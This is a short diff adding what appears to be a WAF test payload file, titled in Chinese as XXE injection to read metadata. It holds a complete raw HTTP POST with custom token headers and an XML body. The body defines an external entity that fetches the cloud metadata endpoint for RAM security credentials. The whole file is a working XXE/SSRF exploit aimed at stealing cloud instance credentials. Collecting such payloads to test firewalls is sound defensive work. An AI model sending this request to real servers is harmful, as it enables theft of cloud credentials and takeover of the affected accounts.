@@ -1,0 +1,15 @@
+# XML外部实体注入_读取元数据
+# 利用SSRF漏洞我们可以读取到服务器的实例元数据信息。实例元数据包含当前ECS实例存于云系统中的一些基本信息，包括：实例ID、IP地址、实例操作系统名称等。可以使用这些元数据管理或配置 ECS实例。
+POST /?bid=hd_tag_m8mv24uj HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24uj
+RM-PRO-Token: 7ed94968b6b4228317be2f141833f2dc
+RM-PRO-Time: 1742808415237
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/ram/security-credentials/" >]>
+<name>&xxe;</name>
